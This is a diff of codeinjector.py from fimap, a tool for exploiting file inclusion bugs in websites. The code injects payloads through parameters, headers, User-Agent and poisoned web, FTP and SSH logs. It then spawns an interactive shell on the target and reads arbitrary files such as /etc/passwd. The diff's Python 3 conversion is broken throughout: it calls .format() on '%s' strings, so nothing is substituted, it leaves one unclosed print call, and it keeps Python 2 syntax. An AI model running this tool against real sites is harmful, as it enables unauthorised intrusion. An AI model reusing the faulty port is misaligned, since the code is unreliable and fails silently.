@@ -80,14 +80,14 @@ class codeinjector(baseClass):
         if (not isUnix and shcode[1]==":" and prefix != ""):
             shcode = shcode[3:]
         
-        payload = "%s%s%s" %(prefix, shcode, suffix)
+        payload = "%s%s%s".format(prefix, shcode, suffix)
         if (ispost == 0):
-            fpath = fpath.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))
+            fpath = fpath.replace("%s=%s".format(param, paramvalue), "%s=%s".format(param, payload))
         elif (ispost == 1):
-            postdata = postdata.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))
+            postdata = postdata.replace("%s=%s".format(param, paramvalue), "%s=%s".format(param, payload))
         elif (ispost == 2):
             tmp = header_dict[vulnheaderkey]
-            tmp = tmp.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))
+            tmp = tmp.replace("%s=%s".format(param, paramvalue), "%s=%s".format(param, payload))
             header_dict[vulnheaderkey] = tmp
         
         return(fpath, postdata, header_dict, payload)
@@ -118,14 +118,14 @@ class codeinjector(baseClass):
                 name = item.getName()
                 payload = None
                 if (item.isUnix() and isUnix) or (item.isWindows() and not isUnix):
-                    self._log("Testing execution thru '%s'..."%(name), self.LOG_INFO)
+                    self._log("Testing execution thru '%s'...".format(name), self.LOG_INFO)
                     testload = item.generatePayload(shell_test_code)
                     if (mode.find("A") != -1):
                         self.setUserAgent(testload)
                         code = self.doPostRequest(url, postdata, header_dict)
                     elif (mode.find("P") != -1):
                         if (postdata != ""):
-                            testload = "%s&%s" %(postdata, testload)
+                            testload = "%s&%s".format(postdata, testload)
                         code = self.doPostRequest(url, testload, header_dict)
                     elif (mode.find("R") != -1):
                         code = self.executeRFI(url, postdata, appendix, testload, header_dict)
@@ -133,22 +133,22 @@ class codeinjector(baseClass):
                         testload = self.convertUserloadToLogInjection(testload)
                         testload = "data=" + base64.b64encode(testload)
                         if (postdata != ""):
-                            testload = "%s&%s" %(postdata, testload)
+                            testload = "%s&%s".format(postdata, testload)
                         code = self.doPostRequest(url, testload, header_dict)
                     if code != None and code.find(shell_test_result) != -1:
                         working_shell = item
-                        self._log("Execution thru '%s' works!"%(name), self.LOG_ALWAYS)
+                        self._log("Execution thru '%s' works!".format(name), self.LOG_ALWAYS)
                         if (kernel == None):
                             self._log("Requesting kernel version...", self.LOG_DEBUG)
                             uname_cmd = item.generatePayload(xml2config.getKernelCode(isUnix))
                             kernel = self.__doHaxRequest(url, postdata, mode, uname_cmd, langClass, suffix, headerDict=header_dict).strip()
-                            self._log("Kernel received: %s" %(kernel), self.LOG_DEBUG)
+                            self._log("Kernel received: %s".format(kernel), self.LOG_DEBUG)
                             domain.setAttribute("kernel", kernel)
                             self.saveXML()
 
                         break
                 else:
-                    self._log("Skipping execution method '%s'..."%(name), self.LOG_DEBUG)
+                    self._log("Skipping execution method '%s'...".format(name), self.LOG_DEBUG)
                      
             except KeyboardInterrupt:
                 self._log("Aborted by user.", self.LOG_WARN)
@@ -197,7 +197,7 @@ class codeinjector(baseClass):
         sys_inject_works = False
         working_shell    = None
 
-        url  = "http://%s%s" %(hostname, fpath)
+        url  = "http://%s%s".format(hostname, fpath)
 
         code = None
         quiz, answer = langClass.generateQuiz()
@@ -207,22 +207,22 @@ class codeinjector(baseClass):
 
         if (mode.find("A") != -1 and mode.find("x") != -1):
             # Some exploit which is exploitable by changing the useragent.
-            self._log("Testing %s-code injection thru User-Agent..."%(language), self.LOG_INFO)
+            self._log("Testing %s-code injection thru User-Agent...".format(language), self.LOG_INFO)
             code = self.__doHaxRequest(url, postdata, mode, php_test_code, langClass, suffix, headerDict=header_dict)
 
         elif (mode.find("P") != -1 and mode.find("x") != -1):
             # Some exploit which is exploitable by sending POST requests.
-            self._log("Testing %s-code injection thru POST..."%(language), self.LOG_INFO)
+            self._log("Testing %s-code injection thru POST...".format(language), self.LOG_INFO)
             code = self.__doHaxRequest(url, postdata, mode, php_test_code, langClass, suffix, headerDict=header_dict)
             
         elif (mode.find("L") != -1):
             # Some exploit which is exploitable by injecting specially crafted log entries.
             if (mode.find("H") != -1):
-                self._log("Testing %s-code injection thru Logfile HTTP-UA-Injection..."%(language), self.LOG_INFO)
+                self._log("Testing %s-code injection thru Logfile HTTP-UA-Injection...".format(language), self.LOG_INFO)
             elif (mode.find("F") != -1):
-                self._log("Testing %s-code injection thru Logfile FTP-Username-Injection..."%(language), self.LOG_INFO)
+                self._log("Testing %s-code injection thru Logfile FTP-Username-Injection...".format(language), self.LOG_INFO)
             elif (mode.find("S") != -1):
-                self._log("Testing %s-code injection thru Logfile SSH-Username-Injection..."%(language), self.LOG_INFO)
+                self._log("Testing %s-code injection thru Logfile SSH-Username-Injection...".format(language), self.LOG_INFO)
             code = self.__doHaxRequest(url, postdata, mode, php_test_code, langClass, suffix, headerDict=header_dict)
             
         elif (mode.find("R") != -1):
@@ -231,28 +231,28 @@ class codeinjector(baseClass):
             if settings["dynamic_rfi"]["mode"] == "ftp":
                 self._log("Testing code thru FTP->RFI...", self.LOG_INFO)
                 if (ispost == 0):
-                    url  = url.replace("%s=%s"%(param, payload), "%s=%s"%(param, settings["dynamic_rfi"]["ftp"]["http_map"]))
+                    url  = url.replace("%s=%s".format(param, payload), "%s=%s".format(param, settings["dynamic_rfi"]["ftp"]["http_map"]))
                 elif (ispost == 1):
-                    postdata = postdata.replace("%s=%s"%(param, payload), "%s=%s"%(param, settings["dynamic_rfi"]["ftp"]["http_map"]))
+                    postdata = postdata.replace("%s=%s".format(param, payload), "%s=%s".format(param, settings["dynamic_rfi"]["ftp"]["http_map"]))
                 elif (ispost == 2):
                     tmp = header_dict[vulnheaderkey]
-                    tmp = tmp.replace("%s=%s"%(param, payload), "%s=%s"%(param, settings["dynamic_rfi"]["ftp"]["http_map"]))
+                    tmp = tmp.replace("%s=%s".format(param, payload), "%s=%s".format(param, settings["dynamic_rfi"]["ftp"]["http_map"]))
                     header_dict[vulnheaderkey] = tmp
                 code = self.__doHaxRequest(url, postdata, mode, php_test_code, langClass, appendix, headerDict=header_dict)
                   
             elif settings["dynamic_rfi"]["mode"] == "local":
                 self._log("Testing code thru LocalHTTP->RFI...", self.LOG_INFO)
                 if (ispost == 0):
-                    url  = url.replace("%s=%s"%(param, payload), "%s=%s"%(param, settings["dynamic_rfi"]["local"]["http_map"]))
+                    url  = url.replace("%s=%s".format(param, payload), "%s=%s".format(param, settings["dynamic_rfi"]["local"]["http_map"]))
                 elif (ispost == 1):
-                    postdata = postdata.replace("%s=%s"%(param, payload), "%s=%s"%(param, settings["dynamic_rfi"]["local"]["http_map"]))
+                    postdata = postdata.replace("%s=%s".format(param, payload), "%s=%s".format(param, settings["dynamic_rfi"]["local"]["http_map"]))
                 elif (ispost == 2):
                     tmp = header_dict[vulnheaderkey]
-                    tmp = tmp.replace("%s=%s"%(param, payload), "%s=%s"%(param, settings["dynamic_rfi"]["local"]["http_map"]))
+                    tmp = tmp.replace("%s=%s".format(param, payload), "%s=%s".format(param, settings["dynamic_rfi"]["local"]["http_map"]))
                     header_dict[vulnheaderkey] = tmp
                 code = self.__doHaxRequest(url, postdata, mode, php_test_code, langClass, appendix, headerDict=header_dict)
             else:
-                print "fimap is currently not configured to exploit RFI vulnerabilities."
+                print("fimap is currently not configured to exploit RFI vulnerabilities.")
                 sys.exit(1)
         elif (mode.find("r") != -1):
             # Some point which we know that we can include files but we haven't found any good vectors.
@@ -267,14 +267,14 @@ class codeinjector(baseClass):
             for attacks in plugin_attacks:
                 pluginName, attackmode = attacks
                 label, callback = attackmode
-                textarr.append("[%d] [%s] %s" %(idx, pluginName, label))
+                textarr.append("[%d] [%s] %s".format(idx, pluginName, label))
                 choose[idx] = callback
                 idx += 1
 
             textarr.append("[q] Quit")
             
             if (idx == 1):
-                print "Sorry. No plugin was interested :("
+                print("Sorry. No plugin was interested :(")
                 sys.exit(0)
             else:
                 inp = ""
@@ -288,12 +288,12 @@ class codeinjector(baseClass):
                     try:
                         val = int(inp)
                         if (val < 0 or val > idx-1):
-                            print "Invalid selection index. Hit 'q' to quit."
+                            print("Invalid selection index. Hit 'q' to quit.")
                         else:
                             haxhelper = HaxHelper(self, url, postdata, mode, langClass, suffix, isUnix, sys_inject_works, None)
                             plugman.broadcast_callback(choose[val], haxhelper)
                     except:
-                        print "Invalid number selected. Hit 'q' to quit."
+                        print("Invalid number selected. Hit 'q' to quit.")
                     
 
                     
@@ -301,12 +301,12 @@ class codeinjector(baseClass):
             
             
         if code == None:
-            self._log("%s-code testing failed! code=None"%(language), self.LOG_ERROR)
+            self._log("%s-code testing failed! code=None".format(language), self.LOG_ERROR)
             sys.exit(1)
 
 
         if (code.find(php_test_result) != -1):
-            self._log("%s Injection works! Testing if execution works..."%(language), self.LOG_ALWAYS)
+            self._log("%s Injection works! Testing if execution works...".format(language), self.LOG_ALWAYS)
             php_inject_works = True
             
             working_shell = self.probeExecMethods(url, postdata, header_dict, domain, vuln)
@@ -353,7 +353,7 @@ class codeinjector(baseClass):
                         
                         
                         cmd = ""
-                        print "Please wait - Setting up shell (one request)..."
+                        print("Please wait - Setting up shell (one request)...")
                         #pwd_cmd = item.generatePayload("pwd;whoami")
                         
                         
@@ -365,7 +365,7 @@ class codeinjector(baseClass):
                         pwd_cmd = working_shell.generatePayload(xml2config.concatCommands(commands, isUnix))
                         tmp = self.__doHaxRequest(url, postdata, mode, pwd_cmd, langClass, suffix, headerDict=header_dict).strip()
                         if (tmp.strip() == ""):
-                            print "Failed to setup shell! The resulting string was empty!"
+                            print("Failed to setup shell! The resulting string was empty!")
                             break
                         
                         curdir = "<null_dir>"
@@ -387,7 +387,7 @@ class codeinjector(baseClass):
                         if (curusr) == "":
                             curusr = "fimap"
                         
-                        print shell_banner
+                        print(shell_banner)
 
                         while 1==1:
                             cmd = None
@@ -395,7 +395,7 @@ class codeinjector(baseClass):
                                 # Execute commands the user defined through parameters.
                                 if (len(self.config["p_exploit_cmds"]) > 0):
                                     cmd = self.config["p_exploit_cmds"][0]
-                                    self._log("Executing command: %s" %(cmd), self.LOG_INFO)
+                                    self._log("Executing command: %s".format(cmd), self.LOG_INFO)
                                     del(self.config["p_exploit_cmds"][0])
                                 else:
                                     self._log("Done with user supplied command batch.", self.LOG_INFO);
@@ -403,7 +403,7 @@ class codeinjector(baseClass):
                                     
                             else:
                                 # Ask the user for a shell command.
-                                cmd = raw_input("fishell@%s:%s$> " %(curusr,curdir))
+                                cmd = raw_input("fishell@%s:%s$> ".format(curusr,curdir))
                             if cmd == "q" or cmd == "quit": break
                             
                             try:
@@ -434,11 +434,11 @@ class codeinjector(baseClass):
                                                     if (c != ""):
                                                         tab_choice.append(c)
                                             
-                                    print code.strip()
+                                    print(code.strip())
                             except KeyboardInterrupt:
-                                print "\nCancelled by user."
-                        print "See ya dude!"
-                        print "Do not forget to close this security hole."
+                                print("\nCancelled by user.")
+                        print("See ya dude!")
+                        print("Do not forget to close this security hole.")
                     else:
                         haxhelper = HaxHelper(self, url, postdata, mode, langClass, suffix, isUnix, sys_inject_works, working_shell)
                         plugman.broadcast_callback(attack, haxhelper)
@@ -456,9 +456,9 @@ class codeinjector(baseClass):
 
                     code = self.__doHaxRequest(url, postdata, mode, shellcode, langClass, appendix, headerDict=header_dict)
                     if (code == None):
-                        print "Exploiting Failed!"
+                        print("Exploiting Failed!")
                         sys.exit(1)
-                    print code.strip()
+                    print(code.strip())
         elif (code.find(php_test_code) != -1):
             
             try:
@@ -469,35 +469,35 @@ class codeinjector(baseClass):
                     while 1==1:
                         inp = raw_input("Absolute filepath you want to read out: ")
                         if (inp == "q"):
-                            print "Fix this hole! Bye."
+                            print("Fix this hole! Bye.")
                             sys.exit(0)
-                        payload = "%s%s%s" %(prefix, inp, suffix)
+                        payload = "%s%s%s".format(prefix, inp, suffix)
                         if (not ispost):
-                            path = fpath.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))
+                            path = fpath.replace("%s=%s".format(param, paramvalue), "%s=%s".format(param, payload))
                         else:
-                            postdata = postdata.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))
-                        url = "http://%s%s" %(hostname, path)
+                            postdata = postdata.replace("%s=%s".format(param, paramvalue), "%s=%s".format(param, payload))
+                        url = "http://%s%s".format(hostname, path)
                         code = self.__doHaxRequest(url, postdata, mode, "", langClass, appendix, False, headerDict=header_dict)
-                        print "--- Unfiltered output starts here ---"
-                        print code
-                        print "--- EOF ---"
+                        print("--- Unfiltered output starts here ---")
+                        print(code)
+                        print("--- EOF ---")
                 else:
-                    print "Cancelled. If you want to read out files by hand use this URL:"
+                    print("Cancelled. If you want to read out files by hand use this URL:")
                     
                     if (not ispost):
-                        path = fpath.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, "ABSOLUTE_FILE_GOES_HERE"))
-                        url = "http://%s%s" %(hostname, path)
-                        print "URL: " + url
+                        path = fpath.replace("%s=%s".format(param, paramvalue), "%s=%s".format(param, "ABSOLUTE_FILE_GOES_HERE"))
+                        url = "http://%s%s".format(hostname, path)
+                        print("URL: " + url)
                     else:
-                        postdata = postdata.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, "ABSOLUTE_FILE_GOES_HERE"))
-                        url = "http://%s%s" %(hostname, path)
-                        print "URL          : " + url
-                        print "With Postdata: " + postdata
+                        postdata = postdata.replace("%s=%s".format(param, paramvalue), "%s=%s".format(param, "ABSOLUTE_FILE_GOES_HERE"))
+                        url = "http://%s%s".format(hostname, path)
+                        print("URL          : " + url)
+                        print("With Postdata: " + postdata)
             except KeyboardInterrupt:
                 raise
 
         else:
-            print "Failed to test injection. :("
+            print("Failed to test injection. :(")
 
 
     def _doHaxRequest(self, url, postdata, m, payload, langClass, appendix=None, doFilter=True, headerDict=None):
@@ -510,15 +510,15 @@ class codeinjector(baseClass):
         
         userload = None
         if doFilter:
-            userload = "%s %s %s" %(langClass.generatePrint(rndStart), payload, langClass.generatePrint(rndEnd))
+            userload = "%s %s %s".format(langClass.generatePrint(rndStart), payload, langClass.generatePrint(rndEnd))
         else:
-            pass #userload = "%s%s%s" %(rndStart, payload, rndEnd)
+            pass #userload = "%s%s%s".format(rndStart, payload, rndEnd)
             
         if (m.find("A") != -1):
             self.setUserAgent(userload)
             code = self.doPostRequest(url, postdata, additionalHeaders = headerDict)
         elif (m.find("P") != -1):
-            if (postdata != ""): userload = "%s&%s" %(postdata, userload)
+            if (postdata != ""): userload = "%s&%s".format(postdata, userload)
             code = self.doPostRequest(url, userload, additionalHeaders = headerDict)
         elif (m.find("R") != -1):
             code = self.executeRFI(url, postdata, appendix, userload, headerDict)
@@ -528,7 +528,7 @@ class codeinjector(baseClass):
                 testcode = langClass.generateQuiz()
                 p = "data=" + base64.b64encode(self.convertUserloadToLogInjection(testcode[0]))
                 if (postdata != ""):
-                    p = "%s&%s" %(postdata, p)
+                    p = "%s&%s".format(postdata, p)
                 code = self.doPostRequest(url, p)
                 
                 if (code == None):
@@ -553,7 +553,7 @@ class codeinjector(baseClass):
                         testcode = langClass.generateQuiz()
                         p = "data=" + base64.b64encode(self.convertUserloadToLogInjection(testcode[0]))
                         if (postdata != ""):
-                            p = "%s&%s" %(postdata, p)
+                            p = "%s&%s".format(postdata, p)
                         code = self.doPostRequest(url, p, additionalHeaders = headerDict)
     
                         if (code.find(testcode[1]) == -1):
@@ -573,7 +573,7 @@ class codeinjector(baseClass):
                             testcode = langClass.generateQuiz()
                             p = "data=" + base64.b64encode(self.convertUserloadToLogInjection(testcode[0]))
                             if (postdata != ""):
-                                p = "%s&%s" %(postdata, p)
+                                p = "%s&%s".format(postdata, p)
                             code = self.doPostRequest(url, p, additionalHeaders = headerDict)
                             
                             if (code.find(testcode[1]) != -1):
@@ -603,8 +603,8 @@ class codeinjector(baseClass):
                             hostname = hostname[:hostname.find("/")]
                         if (hostname.startswith("www.")):
                             hostname = hostname[4:]
-                        self._log("Trying to connect to ssh://'%s'"%(hostname), self.LOG_DEBUG)
-                        self._log("SSH-Username: %s"%(kickstarter), self.LOG_DEVEL)
+                        self._log("Trying to connect to ssh://'%s'".format(hostname), self.LOG_DEBUG)
+                        self._log("SSH-Username: %s".format(kickstarter), self.LOG_DEVEL)
                         
                         try:
                             ssh.Connection(hostname, username=kickstarter, password="asdf")
@@ -615,7 +615,7 @@ class codeinjector(baseClass):
                         testcode = langClass.generateQuiz()
                         p = "data=" + base64.b64encode(self.convertUserloadToLogInjection(testcode[0]))
                         if (postdata != ""):
-                            p = "%s&%s" %(postdata, p)
+                            p = "%s&%s".format(postdata, p)
                         code = self.doPostRequest(url, p, additionalHeaders = headerDict)
                         
                 else:
@@ -627,7 +627,7 @@ class codeinjector(baseClass):
                 userload = self.convertUserloadToLogInjection(userload)
                 userload = "data=" + base64.b64encode(userload)
                 if (postdata != ""):
-                    userload = "%s&%s" %(postdata, userload)
+                    userload = "%s&%s".format(postdata, userload)
                 code = self.doPostRequest(url, userload, additionalHeaders = headerDict)
         if (code != None): 
             if doFilter:
@@ -640,53 +640,53 @@ class codeinjector(baseClass):
         langClass = xml2config.getAllLangSets()
         
         for langName, langObj in langClass.items():
-            print "Testing language %s..." %(langName)
+            print("Testing language %s...".format(langName))
             c, r = langObj.generateQuiz()
             
             enc_c = self.payload_encode(c)
             
             if (settings["dynamic_rfi"]["mode"] == "local"):
-                print "Testing Local->RFI configuration..."
+                print("Testing Local->RFI configuration...")
                 code = self.executeRFI(settings["dynamic_rfi"]["local"]["http_map"], "", "", c, {})
                 if (code == enc_c):
-                    print "Dynamic RFI works!"
+                    print("Dynamic RFI works!")
                     for ext in langObj.getExtentions():
-                        print "Testing %s interpreter..." %(ext)
+                        print("Testing %s interpreter...".format(ext)
                         #settings["dynamic_rfi"]["ftp"]["ftp_path"] = settings["dynamic_rfi"]["local"]["local_path"] + ext
                         code = self.executeRFI(settings["dynamic_rfi"]["local"]["http_map"] + ext, "", ext, c, {})
                         if (code == r):
-                            print "WARNING! Files which ends with %s will be interpreted! Fix that!"%(ext)
+                            print("WARNING! Files which ends with %s will be interpreted! Fix that!".format(ext))
                         else:
                             pass # Seems to be not interpreted...
                 else:
-                    print "Failed! Something went wrong..."
+                    print("Failed! Something went wrong...")
     
     
             elif (settings["dynamic_rfi"]["mode"] == "ftp"):
-                print "Testing FTP->RFI configuration..."
+                print("Testing FTP->RFI configuration...")
                 code = self.executeRFI(settings["dynamic_rfi"]["ftp"]["http_map"], "", "", c, {})
                 if (code != None):
                     code = code.strip()
                     if (code == enc_c):
-                        print "Dynamic RFI works!"
+                        print("Dynamic RFI works!")
                         for ext in langObj.getExtentions():
-                            print "Testing %s interpreter..."%(ext)
+                            print("Testing %s interpreter...".format(ext))
                             #settings["dynamic_rfi"]["ftp"]["ftp_path"] = settings["dynamic_rfi"]["ftp"]["ftp_path"] + ext
                             code = self.executeRFI(settings["dynamic_rfi"]["ftp"]["http_map"] + ext, "", ext, c, {})
                             if (code.find(r) != -1):
-                                print "WARNING! Files which ends with %s will be interpreted! Fix that!"%(ext)
+                                print("WARNING! Files which ends with %s will be interpreted! Fix that!".format(ext))
                             else:
                                 pass # Seems to be not interpreted...
                                 
     
                     else:
-                        print "Failed! Something went wrong..."
-                        print "Code: " + code;
+                        print("Failed! Something went wrong...")
+                        print("Code: " + code)
                 else:
-                    print "Code == None. That's not good! Failed!"
+                    print("Code == None. That's not good! Failed!")
             else:
-                print "You haven't enabled and\\or configurated fimap RFI mode."
-                print "Fix that in config.py"
+                print("You haven't enabled and\\or configurated fimap RFI mode.")
+                print("Fix that in config.py")
                 sys.exit(0)
             
 
@@ -706,7 +706,7 @@ class codeinjector(baseClass):
         langClass = xml2config.getAllLangSets()[language]
         
         if (syst):
-            header = ":: Available Attacks - %s and SHELL access ::" %(language)
+            header = ":: Available Attacks - %s and SHELL access ::".format(language)
             textarr.append("[1] Spawn fimap shell")
             choose[1] = "fimap_shell"
             idx = 2
@@ -714,16 +714,16 @@ class codeinjector(baseClass):
                 if (payloadobj.isForUnix() and isUnix or payloadobj.isForWindows() and not isUnix):
                     k = payloadobj.getName()
                     v = payloadobj
-                    textarr.append("[%d] %s"%(idx,k))
+                    textarr.append("[%d] %s".format(idx,k))
                     choose[idx] = v
                     idx = idx +1
 
         else:
-            header = ":: Available Attacks - %s Only ::" %(language)
+            header = ":: Available Attacks - %s Only ::".format(language)
             for payloadobj in langClass.getPayloads():
                 k = payloadobj.getName()
                 v = payloadobj
-                textarr.append("[%d] %s"%(idx,k))
+                textarr.append("[%d] %s".format(idx,k))
                 choose[idx] = v
                 idx = idx +1
 
@@ -733,7 +733,7 @@ class codeinjector(baseClass):
         for attacks in plugin_attacks:
             pluginName, attackmode = attacks
             label, callback = attackmode
-            textarr.append("[%d] [%s] %s" %(idx, pluginName, label))
+            textarr.append("[%d] [%s] %s".format(idx, pluginName, label))
             choose[idx] = callback
             idx += 1
 
@@ -748,7 +748,7 @@ class codeinjector(baseClass):
                 return(tech)
 
             except Exception, err:
-                print "Invalid attack. Press 'q' to break."
+                print("Invalid attack. Press 'q' to break.")
         
         
     def executeRFI(self, URL, postdata, appendix, content, header):
@@ -773,8 +773,8 @@ class codeinjector(baseClass):
     def payload_encode(self, content):
         if (self.config["p_rfi_encode"] != None):
             if (self.config["p_rfi_encode"] == "php_b64"):
-                content = "<?php echo base64_decode(\"%s\"); ?>"%(base64.b64encode(content))
-                self._log("Encoded content: %s" %(content), self.LOG_DEBUG)
+                content = "<?php echo base64_decode(\"%s\"); ?>".format(base64.b64encode(content))
+                self._log("Encoded content: %s".format(content), self.LOG_DEBUG)
             else:
                 self._log("Invalid RFI encoder selected!", self.LOG_WARN);
         
@@ -807,39 +807,39 @@ class codeinjector(baseClass):
             if (showit or not OnlyExploitable):
                 choose[idx] = n
                 if (kernel != None):
-                    textarr.append("[%d] %s (%s)" %(idx, host, kernel))
+                    textarr.append("[%d] %s (%s)".format(idx, host, kernel))
                 else:
-                    textarr.append("[%d] %s" %(idx, host))
+                    textarr.append("[%d] %s".format(idx, host))
                 idx = idx +1
             else:
                 missingCount += 1
     
         if (idx == 1):
-            print "No exploitable domains found."
+            print("No exploitable domains found.")
             if (missingCount > 0):
-                print "There are some domains hidden tho because they can't be exploited by fimap without help."
-                print "To show them start fimap with *uppercase* -X"
+                print("There are some domains hidden tho because they can't be exploited by fimap without help.")
+                print("To show them start fimap with *uppercase* -X")
             sys.exit(0)
     
         if (missingCount > 0):
-            textarr.append("[ ] And %d hosts with no valid attack vectors."%(missingCount))
+            textarr.append("[ ] And %d hosts with no valid attack vectors.".format(missingCount))
             textarr.append("    Type '?' to see what it means.")
         textarr.append("[q] Quit")
         self.drawBox(header, textarr)
         if (doRemoteWarn):
-            print "WARNING: Some domains may be not listed here because dynamic_rfi is not configured! "
+            print("WARNING: Some domains may be not listed here because dynamic_rfi is not configured! ")
 
         # If the user has picked the domain already through a parameter
         # we just try to set it here and return its result.
         if (self.config["p_exploit_domain"] != None):
             wantedDomain = self.config["p_exploit_domain"]
-            self._log("Trying to autoselect target with hostname '%s'..." %(wantedDomain), self.LOG_INFO)
+            self._log("Trying to autoselect target with hostname '%s'...".format(wantedDomain), self.LOG_INFO)
 
             for n in nodes:
                 if (n.getAttribute("hostname") == wantedDomain):
                     return(n)
             
-            print "The domain '%s' doesn't exist! Can't continue :(" %(wantedDomain)
+            print("The domain '%s' doesn't exist! Can't continue :(".format(wantedDomain))
             sys.exit(1)
 
 
@@ -849,29 +849,29 @@ class codeinjector(baseClass):
             if (c == "q"):
                 sys.exit(0)
             elif (c == "?"):
-                print "------------------------------------------------------------------------------"
-                print "Why are some domains not visible?"
-                print "This can have two reasons."
-                print "* Non executable files:"
-                print "  It's likly that fimap has found an inclusion bug and was able to read out"
-                print "  non executable files like '/etc/passwd' or 'c:\\boot.ini'."
-                print "  In cases like this it's not possible to automaticly attack the machine."
-                print "  However if you are able to upload a file on the webserver you have high"
-                print "  chances to spawn a shell."
-                print "* Remote File Inclusion bugs:"
-                print "  If you have found RFI only bugs you have to enable Dynamic RFI in order to"
-                print "  exploit the bug with fimap. The RFI-Only domains will be hidden unless you"
-                print "  have configured and enabled Dynamic RFI."
-                print "  However you can always take a look at the ~/fimap_result.xml , get your info"
-                print "  and do it manually."
-                print "------------------------------------------------------------------------------"
+                print("------------------------------------------------------------------------------")
+                print("Why are some domains not visible?")
+                print("This can have two reasons.")
+                print("* Non executable files:")
+                print("  It's likly that fimap has found an inclusion bug and was able to read out")
+                print("  non executable files like '/etc/passwd' or 'c:\\boot.ini'.")
+                print("  In cases like this it's not possible to automaticly attack the machine.")
+                print("  However if you are able to upload a file on the webserver you have high")
+                print("  chances to spawn a shell.")
+                print("* Remote File Inclusion bugs:")
+                print("  If you have found RFI only bugs you have to enable Dynamic RFI in order to")
+                print("  exploit the bug with fimap. The RFI-Only domains will be hidden unless you")
+                print("  have configured and enabled Dynamic RFI.")
+                print("  However you can always take a look at the ~/fimap_result.xml , get your info")
+                print("  and do it manually.")
+                print("------------------------------------------------------------------------------")
             else:
               try:
                   c = int(c)
                   ret = choose[c]
                   return(ret)
               except:
-                  print "Invalid Domain ID."
+                  print("Invalid Domain ID.")
                   
 
 
@@ -910,11 +910,11 @@ class codeinjector(baseClass):
                     return(n)
                 choose[idx] = n
                 if (ispost == 0):
-                    textarr.append("[%d] URL: '%s' injecting file: '%s' using GET-param: '%s'" %(idx, path, file, param))
+                    textarr.append("[%d] URL: '%s' injecting file: '%s' using GET-param: '%s'".format(idx, path, file, param))
                 elif (ispost == 1):
-                    textarr.append("[%d] URL: '%s' injecting file: '%s' using POST-param: '%s'" %(idx, path, file, param))
+                    textarr.append("[%d] URL: '%s' injecting file: '%s' using POST-param: '%s'".format(idx, path, file, param))
                 elif (ispost == 2):
-                    textarr.append("[%d] URL: '%s' injecting file: '%s' using HEADER-param: '%s'" %(idx, path, file, param))
+                    textarr.append("[%d] URL: '%s' injecting file: '%s' using HEADER-param: '%s'".format(idx, path, file, param))
                 idx = idx +1
             elif (mode.find("r") != -1):
                 hasAtLeastAReadable = True
@@ -922,11 +922,11 @@ class codeinjector(baseClass):
             
         if (idx == 1):
             if (doRemoteWarn):
-                print "WARNING: Some bugs can not be used because dynamic_rfi is not configured!"
+                print("WARNING: Some bugs can not be used because dynamic_rfi is not configured!")
             if (hasAtLeastAReadable):
                 return(n)
             else:
-                print "This domain has no usable bugs."
+                print("This domain has no usable bugs.")
                 sys.exit(1)
 
         
@@ -934,7 +934,7 @@ class codeinjector(baseClass):
         self.drawBox(header, textarr)
 
         if (doRemoteWarn):
-            print "WARNING: Some bugs are suppressed because dynamic_rfi is not configured!"
+            print("WARNING: Some bugs are suppressed because dynamic_rfi is not configured!")
 
         
 
@@ -947,7 +947,7 @@ class codeinjector(baseClass):
                 ret = choose[c]
                 return(ret)
             except:
-                print "Invalid script ID."
+                print("Invalid script ID.")
                 
                 
 class HaxHelper:
@@ -1063,23 +1063,23 @@ class HaxHelper:
         
         ret = ""
         if (not hasPost):
-            ret = "GET %s HTTP/1.1\r\n" %(path)
+            ret = "GET %s HTTP/1.1\r\n".format(path)
         else:
-            ret = "POST %s HTTP/1.1\r\n" %(path)
+            ret = "POST %s HTTP/1.1\r\n".format(path)
         
-        ret += "Host: %s\r\n" %(host)
+        ret += "Host: %s\r\n".format(host)
         
         if header.has_key("Cookie"):
             ret += "Cookie: "
             for k,v in header["Cookie"]:
-                ret += "%s: %s;" %(k,v)
+                ret += "%s: %s;".format(k,v)
             ret += "\r\n"
         
         if (hasPost):
             ret += "Content-Type: application/x-www-form-urlencoded\r\n"
-            ret += "Content-Length: %d\r\n"%(len(post))
+            ret += "Content-Length: %d\r\n".format(len(post))
             ret += "\r\n"
-            ret += "%s\r\n" %(post)
+            ret += "%s\r\n".format(post)
         
         ret += "\r\n"
         
